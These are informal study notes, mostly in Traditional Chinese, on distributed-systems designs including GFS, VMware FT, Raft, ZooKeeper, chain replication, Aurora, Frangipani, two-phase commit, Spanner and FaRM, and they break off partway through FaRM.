Chunk服務器用來存儲實際的數據\nMaster節點知道每一個文件對應的所有的Chunk的ID，這些Chunk每個是64MB大小，它們共同構成了一個文件\nmaster node\nfilename 很多chunk id chunk id chunk server的列表 version 是不是primary chunk write只能在primary上跑 租約時間 Master會在磁盤上存儲log，每次有數據變更時，Master會在磁盤的log中追加一條記錄，並生成CheckPoint（類似於備份點）\nread\nfilename + offset -\u0026gt; chunk id + chunk server list 選一個chunk server -\u0026gt; chunk id + offset 從一般的fs拿檔案 write(只有append)\n當有多個客戶端同時寫同一個文件時，一個客戶端並不能知道文件究竟有多長 沒有一個客戶端會知道文件究竟有多長，因此也就不知道該往什麼樣的偏移量，或者說向哪個Chunk去追加數據。 客戶端可以向Master節點查詢哪個Chunk服務器保存了文件的最後一個Chunk。\n對於某個特定的Chunk來說，在某一個時間點，Master不一定指定了Chunk的主副本。所以，寫文件的時候，需要考慮Chunk的主副本不存在的情況\n如果發現Chunk的主副本不存在，Master會找出所有存有Chunk最新副本的Chunk服務器\n當客戶端想要對文件進行追加，但是又不知道文件尾的Chunk對應的Primary在哪時，Master會等所有存儲了最新Chunk版本的服務器集合完成，然後挑選一個作為Primary，其他的作為Secondary\nMaster會增加版本號，並將版本號寫入磁盤，這樣就算故障了也不會丟失這個數據\nMaster節點會向Primary和Secondary副本對應的服務器發送消息並告訴它們，誰是Primary，誰是Secondary，Chunk的新版本是什麼\nclient寫資料到各個chunk 客戶端會將要追加的數據發送給Primary和Secondary服務器，這些服務器會將數據寫入到一個臨時位置。 最開始，這些數據不會追加到文件中 當所有的服務器都返回確認消息說，已經有了要追加的數據，客戶端會向Primary服務器發送一條消息，將這個數據追加到這個文件中 Primary服務器或許會從大量客戶端收到大量的並發請求，Primary服務器會以某種順序，一次只執行一個請求 Primary會通知所有的Secondary服務器也將客戶端要追加的數據寫入在它們自己存儲的Chunk末尾 如果客戶端從Primary得到寫入失敗，那麼客戶端應該重新發起整個追加過程\nGFS這樣設計的理由是足夠的簡單，但是同時也給應用程序暴露了一些奇怪的數據 這里希望為應用程序提供一個相對簡單的寫入接口，但應用程序需要容忍讀取數據的亂序\n將GFS升級成強一致系統，我可以為你列舉一些你需要考慮的事情\n讓Primary來探測重複的請求 對於Secondary來說，如果Primay要求Secondary執行一個操作，Secondary必須要執行而不是只返回一個錯誤給Primary 於一個嚴格一致的系統來說，是不允許Secondary忽略Primary的請求而沒有任何補償措施的 當Primary要求Secondary追加數據時，直到Primary確信所有的Secondary都能執行數據追加之前，Secondary必須小心不要將數據暴露給讀請求 第一個階段，Primary向Secondary發請求，要求其執行某個操作，並等待Secondary回复說能否完成該操作，這時Secondary並不實際執行操作。 在第二個階段，如果所有Secondary都回复說可以執行該操作，這時Primary才會說，好的，所有Secondary執行剛剛你們回复可以執行的那個操作 兩階段提交（Two-phase commit） 新的Primary上任時，需要顯式的與Secondary進行同步 當Primary崩潰時，可能有一組操作由Primary發送給Secondary 要么對於Secondary需要一個租約系統，就像Primary一樣，這樣就知道Secondary在哪些時間可以合法的響應客戶端 就是raft!!\nvmware ft 複製不能處理軟件中的bug和硬件設計中的缺陷\n如果我們有兩個副本，一個Primay和一個Backup節點，我們總是假設兩個副本中的錯誤是相互獨立的。但是如果它們之間的錯誤是有關聯的，那麼複製對我們就沒有幫助\n這種複制的方案是否值得？因為它使用了我們實際需要的2-3倍的計算機資源\nState Transfer Primary將自己完整狀態，比如說內存中的內容，拷貝並發送給Backup\nReplicated State Machine 它只會從Primary將這些外部事件，例如外部的輸入，發送給Backup。 通常來說，如果有兩台計算機，如果它們從相同的狀態開始，並且它們以相同的順序，在相同的時間，看到了相同的輸入，那麼它們會一直互為副本，並且一直保持一致。\n狀態轉移傳輸的是可能是內存，而復制狀態機會將來自客戶端的操作或者其他外部事件，從Primary傳輸到Backup。\n在多核上工作。這個新系統從我看來使用了狀態轉移，而不是複制狀態機。因為面對多核和並行計算，狀態轉移更加健壯。如果你使用了一台機器，並且將其內存發送過來了，那麼那個內存鏡像就是機器的狀態，並且不受並行計算的影響，但是複制狀態機確實會受並行計算的影響。但是另一方面，我認為這種新的多核方案代價會更高一些。\n會復制機器的完整狀態，這包括了所有的內存，所有的寄存器\n應用程序級別的複制系統。這樣做的後果是，複製這個行為，必須構建在應用程序內部。如果你收到了一系列應用程序級別的操作，你確實需要應用程序參與到復制中來\nVMware FT的獨特之處在於，它從機器級別實現複製，因此它不關心你在機器上運行什麼樣的軟件，它就是複制底層的寄存器和內存\n它的缺點是，它沒有那麼的高效，優點是，你可以將任何現有的軟件，甚至你不需要有這些軟件的源代碼，你也不需要理解這些軟件是如何運行的\nprimary負責收client的request VMM(hyperviser)遇到request會copy一份到secondary(log channel) 不確定性 中斷發生的時間有一樣嗎? 有狀態的指令 (random, timeoftoday) 多核 對此需要特別的request格式 日誌條目的類型 數據: 一般資料或是已經跑完不確定性指令的資料 事件發生時的指令序號 在primary跑request之前會確認backup有收到log!! (ack) 沒收到就不會把response丟回去 就算primary已經做好了 幾乎每一個複制系統都有這個問題，在某個時間點，Primary必須要停下來等待Backup，這對於性能是實打實的限制 所以如果條件允許，人們會更喜歡使用在更高層級做複製的系統（詳見4.2 最後兩段） 也就是應用程式層級的複製 VMM會讓來自primary的response通過，backup的會drop 重複output 如果 primary在傳完response掛掉 backup還沒處理新的log 這樣backup會消耗log來成為primary，之後丟response 但因為現在backup是primary，所以response會被丟回去!! 不過因為都是用TCP連線，所以TCP會drop重複的packet tcp的狀態與原本的primary一樣 對於任何有主從切換的複制系統，基本上不可能將系統設計成不產生重複輸出 為了避免重複輸出，有一個選項是在兩邊都不生成輸出，但這是一個非常糟糕的做法（因為對於客戶端來說就是一次失敗的請求） 當出現主從切換時，切換的兩邊都有可能生成重複的輸出，這意味著，某種程度上來說，所有復制系統的客戶端需要一種重複檢測機制 primary與backup之間有heart beat確認health 還有Test-and-Set確認對方真的掛了 (想像雙方剛好log channel的連線被block) Test-and-Set服務不運行在Primary和Backup的物理服務器上，VMware FT需要通過網絡支持Test-and-Set服務 這有點像一個鎖。為了能夠上線，它們或許會同時發送一個Test-and-Set請求，給Test-and-Set服務。 當第一個請求送達時，Test-and-Set服務會說，這個標誌位之前是0，現在是1 在6.824這門課程中，有個核心的規則就是，你無法判斷另一個計算機是否真的掛了，你所知道的就是，你無法從那台計算機收到網絡報文，你無法判斷是因為那台計算機掛了，還是因為網絡出問題了導致的 raft 整個系統有兩個時間\nserver自己 也就是做了什麼 動作的source 現在該聽誰的 單一source可以處理brain-split raft是共識algorithm，所以要處理consistency\n單一source =\u0026gt; brain-split 也有可能沒有leader，但這個時候system也不能做什麼事 majarity votes =\u0026gt; fault-toroelent commit, and then apply 重要的state (時間)\n所有server的現在時間 currentTerm server自身的時間 votedFor log[] 後面處理log compaction會看到，log還要多一個狀態snapshot 執行期狀態 (做到哪)\nserver自己 commitIndex: log收到哪 lastApplied: log做到哪 leader狀態 nextIndex[]: 要從哪個log開始塞給ith follower matchIndex[]: ith follower做到哪了 接下去就是下面其中一個事件發生\n選leader RequestVote RPC 前提 收到的term要大於等於自己 (所有server的現在時間夠新) 之後就 改votedFor 處理client request AppendEntries RPC 前提 收到的term要大於等於自己 (所有server的現在時間夠新) prevLogIndex 有東西 \u0026amp; prevLogTerm 對得起來 (server自身的時間是對得起來的) 對不起來? prevLogIndex沒東西 return false (leader與自己的狀態對不起來) prevLogTerm不對 把prevLogIndex後面的東西刪掉 之後就 把entries接上去 更新commitIndex 接著就是看state怎麼改變的\n什麼時候apply log\ncommitIndex \u0026gt; lastApplied 同時跟新lastApplied 什麼時候換currentTerm\n收到大於自己term的rpc時 同時換votedFor 成為candidate (來自timeout) leader怎麼知道\n大家commit到哪 (leader怎麼跟新commitIndex) N \u0026gt; commitIndex, a majority of matchIndex[i] ≥ N, and log[N].term == currentTerm 我的prevLogIndex是錯的 AppendEntries回傳false, 之後leader的prevLogIndex自己退一格，retry AppendEntries leader退無可退怎麼辦? 這個時候就是snapshot了 退一格不會太慢 (7.3 快速恢复（Fast Backup）) follower的reply加上，衝突位置(prevLogIndex)的 XTerm: prevLogIndex的位置的term XIndex: XTerm的第一個event的log 位置 XLen: 有多少空白的log 之後有3個case XTerm是空的 從XLen開始蓋 沒看過XTerm的term 從XIndex開始蓋 看過XTerm的term，所以是index對不上 從XIndex-1開始蓋 什麼時候要response給client 收到AppendEntries的過半reply 有一個細節在 6.8 选举定时器（Election Timer） 提到 就是timeout可能有livelock，所以可以像ethernet的CSMA/CD，但是retry的間隔至少要大於heartbeat的間隔\nLinearizability 一個系統的執行歷史是一系列的客戶端請求，或許這是來自多個客戶端的多個請求。如果執行歷史整體可以按照一個順序排列，且排列順序與客戶端請求的實際時間相符合，那麼它是線性一致的\n對於線性一致的順序順序，有兩個限制條件：\n如果一個操作在另一個操作開始前就結束了，那麼這個操作必須在執行歷史中出現在另一個操作前面。 時間序 (可能會出現concurrent) 可以當成從第一個write response最後開始跑的bfs tree 執行歷史中，讀操作，必須在相應的key的寫操作之後。 把tree壓成line 這裡要看一個例子 這個read是3符合Linearizability?\n在第一個write後發read，但是中間經歷重傳，也許read是在write 4之後完成的\n但是這裡的第一個read是在第一個write之後，所以就算丟3也ok\n客戶端永遠也不能在一個線性一致的系統中看到舊的數據（也就是X=1），因為一個線性一致的系統不允許讀出舊的數據 對於讀請求不允許返回舊的數據，只能返回最新的數據。或者說，對於讀請求，線性一致系統只能返回最近一次完成的寫請求寫入的值。\nzookeeper first-in-first-out order 如果系統不提供線性一致性，那麼系統是否還可用？客戶端發送了一個讀請求，但是並沒有得到當前的正確數據，也就是最新的數據，那我們為什麼要相信這個系統是可用的？\n如果read/write都是透過leader做，這樣沒有scalbility\nZookeeper並不要求返回最新的寫入數據。 Zookeeper的方式是，放棄線性一致性，提升read的效率 直接讓follower處理read 但是zookeeper保證會照client的指令order(first-in-first-out)去跑\nhow? 在指令上打index，讓index對到log的index(response中附上log index(zxid))，之後就是確保在log的index大於等於前面坐指令時的log index大的狀態下跑指令 讀寫請求是線性一致的，這讓前面的第一個問題有了解法，同步操作（sync）\n同步操作（sync）就是\n先發一個write (透過raft完成) 之後read要求一定要在前面的write發生之後 (透過first-in-first-out完成) ready file(transcation, seqlock)\n先刪raedy file 做write 創ready file 之後client就能認ready file去讀，但這樣有問題有可能在刪之前ready還在，但中間其他的write啟動了 所以會多一個watch確認ready file有沒有被動，有被通知就要retry Zookeeper可以保證如果某個人刪除了Ready file，相應的通知，會在任何後續的讀請求之前，發送到客戶端。 客戶端會先收到有關Ready file刪除的通知，之後才收到其他在Log中位於刪除Ready file之後的讀請求的響應\nAPI Zookeeper的API某種程度上來說像是一個文件系統 Zookeeper被設計成要被許多可能完全不相關的服務共享使用。所以我們需要一個命名系統來區分不同服務的信息\nZookeeper中包含了3種類型的znode\nRegular znodes 這種znode一旦創建，就永久存在，除非你刪除了它。 Ephemeral znodes 如果Zookeeper認為創建它的客戶端掛了，它會刪除這種類型的znodes 客戶端需要時不時的發送心跳給Zookeeper，這樣Zookeeper才不會刪除客戶端對應的ephemeral znodes。 Sequential znodes Zookeeper實際上創建的文件名是你指定的文件名再加上一個數字。 當有多個客戶端同時創建Sequential文件時，Zookeeper會確保這裡的數字不重合，同時也會確保這裡的數字總是遞增的。 每一個znode都有一個表示當前版本號的version，當znode有更新時，version也會隨之增加\nCREATE(PATH，DATA，FLAG) DELETE(PATH，VERSION) EXIST(PATH，WATCH) GETDATA(PATH，WATCH) SETDATA(PATH，DATA，VERSION) LIST(PATH) acc V是版本號\nWHILE TRUE: X, V = GETDATA(\u0026#34;F\u0026#34;) IF SETDATA(\u0026#34;f\u0026#34;, X + 1, V): BREAK Non-Scalable Lock WHILE TRUE: IF CREATE(\u0026#34;f\u0026#34;, data, ephemeral=TRUE): RETURN IF EXIST(\u0026#34;f\u0026#34;, watch=TRUE): WAIT 最終鎖會以刪除文件的形式釋放，所以我們這里通過EXIST函數加上watch=TRUE，來監測文件的刪除\n羊群效應（Herd Effect） 對於計數器的例子來說，就是當有1000個客戶端同時需要增加計數器時，我們的複雜度是$O(n^2)$，這是處理完1000個客戶端的請求所需要的總時間。\n$loop * watch通知 = O(n^2)$\nScalable Lock CREATE(\u0026#34;f\u0026#34;, data, sequential=TRUE, ephemeral=TRUE) WHILE TRUE: LIST(\u0026#34;f*\u0026#34;) IF NO LOWER #FILE: RETURN IF EXIST(NEXT LOWER #FILE, watch=TRUE): WAIT Chain Replication with Apportioned Queries Chain Replication 所有機器串成linked list，從頭開始處理write，直到碰到最後一個機器才response read就是從tail的狀態直接拉\n可以注意到這個系統是線性一致的!! 同時可以讓read的性能可以scale!!\nFail Recover\nhead, tail fail? 找前一個或是後一個替代 mid fail? 把mid移除，把前一個的write轉給下一個 Chain Replication 與 Raft 從性能上看，對於Raft，如果我們有一個Leader和一些Follower。 Leader需要直接將數據發送給所有的Follower。 所以，當客戶端發送了一個寫請求給Leader，Leader需要自己將這個請求發送給所有的Follower。 然而在Chain Replication中，HEAD只需要將寫請求發送到一個其他節點。 數據在網絡中發送的代價較高，所以Raft Leader的負擔會比Chain Replication中HEAD的負擔更高。 當客戶端請求變多時，Raft Leader會到達一個瓶頸，而不能在單位時間內處理更多的請求。 而同等條件以下，Chain Replication的HEAD可以在單位時間處理更多的請求，瓶頸會來的更晚一些。 另一個與Raft相比的有趣的差別是，Raft中讀請求同樣也需要在Raft Leader中處理，所以Raft Leader可以看到所有的請求。 而在Chain Replication中，每一個節點都可以看到寫請求，但是只有TAIL可以看到讀請求。 所以負載在一定程度上，在HEAD和TAIL之間分擔了，而不是集中在單個Leader節點。 前面分析的故障恢復，Chain Replication也比Raft更加簡單。這也是使用Chain Replication的一個主要動力。 Chain Replication並不能抵禦網絡分區，也不能抵禦腦裂。 總是會有一個外部的權威（External Authority）來決定誰是活的，誰掛了，並確保所有參與者都認可由哪些節點組成一條鏈\nConfiguration Manager的工作就是監測節點存活性，一旦Configuration Manager認為一個節點掛了，它會生成並送出一個新的配置，在這個新的配置中，描述了鏈的新的定義，包含了鏈中所有的節點，HEAD和TAIL\n你是如何使得一個服務是容錯的，不否認自己，同時當有網絡分區時不會出現腦裂呢？ Configuration Manager通常會基於Raft或者Paxos\nAurora RDS的歷史 EC2對於無狀態的Web服務器來說是完美的\n如果突然新增了大量客戶，你可以立刻向Amazon租用更多的EC2實例，並在上面啟動Web服務。這樣你就可以很簡單的對你的Web服務進行擴容\n當Web服務所在的服務器宕機了，是完全沒有問題的，因為Web服務本身沒有狀態，你只需要在一個新的EC2實例上啟動一個新的Web服務就行\n對於數據庫來說，EC2就不像對於Web服務那樣完美了 如果服務器宕機了，那麼它本地硬盤也會無法訪問\n從EC2實例來看，EBS就是一個硬盤，你可以像一個普通的硬盤一樣去格式化它，就像一個類似於ext3格式的文件系統或者任何其他你喜歡的Linux文件系統\n在實現上，EBS底層是一對互為副本的存儲服務器 兩個EBS服務器會使用Chain Replication（9.5）進行複制\n現在你運行了一個數據庫，相應的EC2實例將一個EBS volume掛載成自己的硬盤。當數據庫執行寫磁盤操作時，數據會通過網絡送到EBS服務器。\nEBS的缺點\n如果你在EBS上運行一個數據庫，那麼最終會有大量的數據通過網絡來傳遞 網絡負載更加重要 不太關心CPU和存儲空間的消耗 EBS的容錯性不是很好 出於性能的考慮，Amazon總是將EBS volume的兩個副本存放在同一個數據中心 RDS 將數據庫在多個AZ之間做複製 這樣就算整個數據中心掛了，你還是可以從另一個AZ重新獲得數據而不丟失任何寫操作 對於RDS來說，有且僅有一個EC2實例作為數據庫 這個數據庫將它的data page和WAL Log存儲在EBS，而不是對應服務器的本地硬盤 當數據庫執行了寫Log或者寫page操作時，這些寫請求實際上通過網絡發送到了EBS服務器 每一次數據庫軟件執行一個寫操作，Amazon會自動的，將寫操作拷貝發送到另一個數據中心的AZ中 每一次寫操作，數據除了發送給AZ1的兩個EBS副本之外，還需要通過網絡發送到位於AZ2的副數據庫 副數據庫接下來會將數據再發送給AZ2的兩個獨立的EBS副本 這種Mirrored MySQL比Aurora慢得多的原因是，它通過網絡傳輸了大量的數據\nAurora 在替代EBS的位置，有6個數據的副本，位於3個AZ，每個AZ有2個副本 這里通過網絡傳遞的數據只有Log條目 存儲系統不再是通用（General-Purpose）存儲，這是一個可以理解MySQL Log條目的存儲系統 Aurora並不需要6個副本都確認了寫入才能繼續執行操作 (Quorum) 只要Quorum形成了，也就是任意4個副本確認寫入了，數據庫就可以繼續執行操作 可以處理斷線、太慢的node Quorum 假設有N個副本。為了能夠執行寫請求，必須要確保寫操作被W個副本確認，W小於N Quorum系統要求，任意你要發送寫請求的W個服務器，必須與任意接收讀請求的R個服務器有重疊 這樣任意W個服務器至少與任意R個服務器有一個重合 ($W+R\u0026gt;=N$) 客戶端讀請求可能會得到R個不同的結果，哪一個是正確的呢？ 投票? 可能只有一個是對的 只能確保Read Quorum必須至少與Write Quorum有一個服務器是重合的 版本號（Version） 每一次執行寫請求，你需要將新的數值與一個增加的版本號綁定 從Read Quorum得到了一些回复，客戶端可以直接使用其中的最高版本號的數值 Quorum系統可以調整讀寫的性能。通過調整Read Quorum和Write Quorum，可以使得系統更好的支持讀請求或者寫請求 Aurora\u0026rsquo;s Quorum 不會直接覆蓋資料，append log Quorum系統通常讀寫的數據都是相同的 數據庫服務器寫入的是Log條目，但是讀取的是page 數據庫服務器會記錄每一個存儲服務器 接收了多少Log 收到的最高連續的Log條目號 當一個數據庫服務器需要執行讀操作，它只會挑選擁有最新Log的存儲服務器，然後只向那個服務器發送讀取page的請求 請求發送到存儲服務器，會要求存儲服務器返回當前最新的page數據。在這個時候，存儲服務器才會將Log條目中的新數據更新到page，並將page寫入到自己的磁盤中，之後再將更新了的page返回給數據庫服務器 數據庫服務器有時也會使用Quorum Read!! 如果DB壞了，監控系統可以檢測到Aurora數據庫服務器崩潰 之後就會要求store server把還沒完成的transation丟了 去找遺失的transaction id，對此跑Quorum Read 讓連到的store server保留遺失的transaction id之前的log sharding 目前為止，我們已經知道Aurora將自己的數據分佈在6個副本上，每一個副本都是一個計算機，上面掛了1-2塊磁盤。\n但是如果只是這樣的話，我們不能擁有一個數據大小大於單個機器磁盤空間的數據庫\n因為雖然我們有6台機器，但是並沒有為我們提供6倍的存儲空間\nAmazon的做法是將數據庫的數據，分割存儲到多組存儲服務器上，每一組都是6個副本，分割出來的每一份數據是10GB\n如果一個數據庫需要20GB的數據，那麼這個數據庫會使用2個PG（Protection Group），其中一半的10GB數據在一個PG中，另一半的10GB數據存儲在另一個PG中 recover 一個store server會有其他PG的其中一塊，如果store server掛了，怎麼復原? 對於每一個數據塊，我們會從Protection Group中挑選一個副本，作為數據拷貝的源。 之後，就可以並行的通過網絡將100個數據塊從100個源拷貝到100個目的\nsingle write 對於Aurora來說，通常會有非常大量的只讀數據庫查詢\n對於寫請求，可以只發送給一個數據庫，因為對於後端的存儲服務器來說，只能支持一個寫入者 Log需要按照數字編號，如果只在一個數據庫處理寫請求，非常容易對Log進行編號\n當客戶端向只讀數據庫發送讀請求，只讀數據庫需要弄清楚它需要哪些data page來處理這個讀請求，之後直接從存儲服務器讀取這些data page，並不需要主數據庫的介入\n只讀數據庫也需要更新自身的緩存，所以，Aurora的主數據庫也會將它的Log的拷貝發送給每一個只讀數據庫\ncache \u0026amp; Transaction 我們不想要這個只讀數據庫看到未commit的事務。所以，在主數據庫發給只讀數據庫的Log流中，主數據庫需要指出，哪些事務commit了\n數據庫背後的B-Tree結構非常複雜，可能會定期觸發rebalance(需要有原子性)\n數據庫服務器可以通知存儲服務器說，這部分複雜的Log序列只能以原子性向只讀數據庫展示，也就是要就全展示，不然就不展示 (微事務（Mini-Transaction）)\n教訓 數據庫和存儲系統基本是一起開發出來的，數據庫和存儲系統以一種有趣的方式集成在了一起 通常我們設計系統時，需要有好的隔離解耦來區分上層服務和底層的基礎架構 但是在Aurora面臨的問題中，性能問題是非常嚴重的，它不得不通過模糊服務和底層基礎架構的邊界來獲得35倍的性能提升\n雲基礎架構中什麼更重要的隱含信息\n需要擔心整個AZ會出現故障 需要擔心短暫的慢副本，這是經常會出現的問題 網絡是主要的瓶頸，畢竟Aurora通過網絡發送的是極短的數據，但是相應的，存儲服務器需要做更多的工作 明顯，從Amazon看來，網絡容量相比CPU要重要的多 Frangipani 緩存一致性是指，如果我緩存了一些數據，之後你修改了實際數據但是並沒有考慮我緩存中的數據，必須有一些額外的工作的存在，這樣我的緩存才能與實際數據保持一致\n大部分的討論都會假設Petal就是一個被所有Frangipani使用的，基於網絡的共享磁盤。你可以通過一個塊號或者磁盤上的一個地址來讀寫數據，就像一個普通的硬盤一樣\n在每個工作站或者說每個Frangipani服務器上要持有緩存之外，我們還需要支持Write-Back緩存。 這意味著，如果我想要修改某個數據，比如說我修改了一個文件，只要沒有其他的工作站需要看到我的改動，Frangipani通過Write-Back緩存方式管理這些數據\n在這樣的架構下，一個非常重要的後果是，文件系統的邏輯需要存在於每個工作站上，所有的複雜的邏輯都在工作站中的Frangipani模塊中\n所有的這些修改最初只會在本地緩存中存在，因此類似於創建文件的操作可以非常快的完成，因為只需要修改本地的內存中對於磁盤的緩存。而這些修改要過一會才會寫回到Petal (複雜度的開始)\nFrangipani的挑戰（Challenges） 緩存 文件系統必須要做一些事情來確保客戶端可以讀到最新的寫入文件 (強一致或者線性一致) 但是在一個緩存的環境中，現在說的一致性的問題不是指存儲服務器的一致性，而是 指工作站上的一些修改需要被其他工作站看到 (Cache Coherence) 由於Write-Back緩存，可能會在本地的緩存中堆積了大量的修改 如果我的工作站崩潰了，但是這時這些修改只有部分同步到了Petal，還有部分仍然只存在於本地 我的工作站在執行操作的過程中的崩潰，最好不要損壞其他人同樣會使用的文件系統 (crash recovery) 去中心化的架構帶來的大量的邏輯存在於客戶端之中進而引起的問題 因為所有的文件和目錄都是共享的，非常容易會有兩個工作站在同一個時間修改同一個目錄 (Atomicity) 我們希望類似於創建文件，刪除文件這樣的操作表現的就像即時生效的一樣，同時不會與相同時間其他工作站的操作相互干擾 緩存一致性 Frangipani的緩存一致性核心是由鎖保證的，我們之後在原子性和故障恢復中將會再次看到鎖。\nLock server\nserver 本身 file到owner的map 我們假設鎖是排他鎖（Exclusive Lock），儘管實際上Frangipani中的鎖更加複雜可以支持兩種模式：要么允許一個寫入者持有鎖，要么允許多個讀取者持有鎖 workstation file, lock state, file content的table BUSY: 正在跑syscall IDLE: syscall跑完了 只要係統調用結束了，工作站會在內部釋放鎖 但是從鎖服務器的角度來看，工作站仍然持有鎖 (延遲將鎖還給鎖服務器) 像是folder，就算read好，也許還會在目錄底下再做一些事 Frangipani應用了很多的規則，這些規則使得Frangipani以一種提供緩存一致性的方式來使用鎖\n工作站不允許持有緩存的數據，除非同時也持有了與數據相關的鎖 先向Petal存儲系統寫數據，之後再釋放鎖 如果你在釋放鎖之前，修改了鎖保護的數據，那你必須將修改了的數據寫回到Petal，只有在Petal確認收到了數據，你才可以釋放鎖 最後再從工作站的lock表單中刪除關文件的鎖的記錄和緩存的數據 緩存一致性的訊息 Request: 拿鎖 Grant: lock server通知拿到鎖了 如果從鎖服務器的lock表單中發現鎖已經被其他人持有了，那鎖服務器不能立即交出鎖。 但是一旦鎖被釋放了，鎖服務器會回復一個Grant消息給工作站 這裡的Request和Grant是異步的 Revoke: 要求歸還鎖 如果別人要用，同時workstation的lock state是idle，就會開始跑release lock Release: 還鎖 在還之前會先把log與髒的資料寫回去 優化 idle做延遲還鎖 Frangipani有共享的讀鎖（Shared Read Lock）和排他的寫鎖（Exclusive Write Lock） 原子性（Atomicity） 要么發現文件不存在，要么文件完全存在，但是我們絕不希望它看到中間狀態\nFrangipani在內部實現了一個數據庫風格的事務系統，並且是以鎖為核心。並且，這是一個分佈式事務系統\n首先我的工作站需要獲取所有我需要讀寫數據的鎖，在完成操作之前，我的工作站不會釋放任何一個鎖 為了遵循一致性規則（11.3），將所有修改了的數據寫回到Petal之後，我的工作站才會釋放所有的鎖 之後完成所有的步驟，比如完成所有數據的更新，並將更新寫入到Petal，最後釋放鎖 Frangipani使用鎖實現了兩個幾乎相反的目標。 對於緩存一致性，這裡使用鎖來確保寫操作可以被看見。 但是對於原子性來說，鎖確保了人們在操作完成之前看不到任何寫操作\nFrangipani與其他的系統一樣，需要通過預寫式日誌（Write-Ahead Log，WAL，見10.2）實現故障可恢復的事務（Crash Recoverable Transaction）\n當一個工作站需要完成涉及到多個數據的複雜操作時，在工作站向Petal寫入任何數據之前，工作站會在Petal中自己的Log列表中追加一個Log條目，這個Log條目會描述整個的需要完成的操作\n只有當這個描述了完整操作的Log條目安全的存在於Petal之後，工作站才會開始向Petal發送數據\nFrangipani對於每個工作站都保存了一份獨立的Log (一般都是share一個log) 工作站的Log存儲在Petal，而不是本地磁盤中 每個工作站的獨立的Log，存放在公共的共享存儲中 log裡面有 (Log只包含了對於元數據的修改) Log序列號 (找最新的log) 數組中的每一個元素會有一個Petal中的塊號（Block Number），一個版本號和寫入的數據 類似的數組元素會有多個，這樣就可以用來描述涉及到修改多份文件系統數據的操作。 向Petal寫入數據的時候，如果我們在中途故障退出了，我們需要確認其他組件有足夠的信息能完成我們未完成修改 (log) 如果出事可以讓其他workstation利用原本的log redo!! Distributed Transaction 並發控制（Concurrency Control） 並發控制就是可序列化的別名 Pessimistic (mutex) 兩階段鎖（Two-Phase Locking） 在使用任何數據之前，在執行任何數據的讀寫之前，先獲取鎖 事務必須持有任何已經獲得的鎖，直到事務提交或者Abort，你不允許在事務的中間過程釋放鎖 Optimistic (rwlock) 原子提交（Atomic Commit） 從部分故障中恢復的能力 兩階段提交（Two-Phase Commit） 除了原本的DB，還有一台Transaction Coordinator 因為是transaction，各自的DB會拿有關的所有鎖 開始跑指令 發preare問參與事務的DB好了沒 TC發prepare/commit之前掛了 基於log，重發 (可能需要標這是重複的) TC發prepare/commit之後掛了 log還原自己的狀態 DB收到preare前掛了 DB重開，發現沒有log，回abort DB收到prepare在回了yes之後掛掉 transaction的動作、相關狀態，再回prepare之前都要在log DB重開，有log與prepare，之後TC發prepare就能回yes 都好了就發commit DB收到commit之後掛了 回yes之前掛了 redo, 回yes 回完yes之後掛了 這個時候所有有關的log都被清了(也許)與該改的都寫到HDD了 有可能DB是找不到commit相關訊息的 不論怎樣，DB都會直接回yes 如果遇到網路斷線?\nTC可以retry，如果太久就abort DB是根據prepare的回答 no 自己abort，之後TC的prepare就發no yes 就是等TC的指令，剩下都不能動!! 只要回prepare yes就是等 (BLOCK) A或者B不能決定Commit還是不Commit事務，A和B之間不會交互來達成一致並完成事務的Commit，相反的只有事務協調者可以做決定 數據庫通常對於正確性有一個概念稱為ACID\n可序列化是指，並行的執行一些事物得到的結果，與按照某種串行的順序來執行這些事務，可以得到相同的結果\n使用Raft可以通過將數據複製到多個參與者得到高可用。 Raft的意義在於，即使部分參與的服務器故障了或者不可達，系統仍然能工作。 Raft能做到這一點是因為所有的服務器都在做相同的事情，所以我們不需要所有的服務器都參與，我們只需要過半服務器參與\n兩階段提交，參與者完全沒有在做相同的事情，每個參與者都在做事務中的不同部分，比如A可能在對X加1，B可能在對Y減1。 所以在兩階段提交中，所有的參與者都在做不同的事情。 所有的參與者都必須完成自己那部分工作，這樣事務才能結束，所以這裡需要等待所有的參與者。\nRaft完全就是可用性，而兩階段提交完全不是高可用的，系統中的任何一個部分出錯了，系統都有可能等待直到這個部分修復\n同時具備Raft的高可用性，但同時又有兩階段提交的能力將事務分包給不同的參與者。 這裡的結構實際上是，通過Raft或者Paxos或者其他協議，來複製兩階段提交協議裡的每一個組成部分。 spanner 需求 \u0026amp; 前提 大部分的workload都是read-only transactions read要快 spanner區分read/write \u0026amp; read/only transaction 更好的synchronous replication flexible sharding 分散式transaction (橫跨多個shard) 2pc真的慢，要別的方法 External consistency linearizability + serializability 為了可用性，所以把distributed tranasaction的每個元件包成one Paxos group\nread/write transactions two-phase commit (2pc) with Paxos-replicated participants 基本上與2pc步驟一樣但是所有溝通都是由各個shard的leader做 在shard的leader中有lock table 2pc所以很慢 parallelism many clients, many shards read/only transactions 兩個重點 沒有2pc 只從local replica讀 正確性 Serializable Externally consistent 為什麼不直接讀最新commit的值? T1: Wx Wy C T2: Wx Wy C T3: Rx Ry Snapshot Isolation (SI) 用wall-time做timestamp(TS) 怎麼synchronize wall-time? TrueTime TTinterval = [ earliest, latest ] 在這個區間一定有對的時間 只拉同一個TS的資料(最少不能超過read的TS) 怎麼確保replica夠新? replica \u0026ldquo;safe time\u0026rdquo; read上給時間，直到replica上看到write的時間夠後面才serve 每個transaction都有time-stamp r/w: commit time. r/o: start time. Synchronized timestamps確保external consistency (commit wait) SI確保serializable r/o transactions 怎麼確保r/w在r/o之前完成 (Commit wait) 定義transacation的TS xaction TS = TT.now().latest for r/o, at start time for r/w, when commit begins 在r/w跑commit之前，Commit wait Before commit, delay until TS \u0026lt; TS.now().earliest FaRM, Optimistic Concurrency Control FaRM \u0026amp; Spanner差在 都用2pc Spanner geographic replication r/o transaction \u0026amp; TrueTime bottleneck: speed of light and network delays FaRM 都在同一個data center RDMA(remote dma)限制只能用Optimistic Concurrency Control (OCC) Optimistic Concurrency Control steps read不用lock write直到commit才會真的寫入 commit檢查有沒有衝突 不用server參與!! one-sided RDMA sender給mem addr, read整個cache line bottleneck: CPU time on servers 都用ram存資料 non-volatile RAM 每個rack都有電池在出事之前可以把ram寫到hdd 架構 API(simplified) FaRM transaction API (simplified): txCreate() o = txRead(oid) \u0026ndash; RDMA oid? \u0026lt;region #, address\u0026gt; region # indexes a mapping to [ primary, backup1, ... ] target RDMA NIC uses address directly to read or write RAM o.f += 1 txWrite(oid, o) \u0026ndash; purely local ok = txCommit() \u0026ndash; Figure 4 流程 跑指令 LOCK 檢查lock state, version 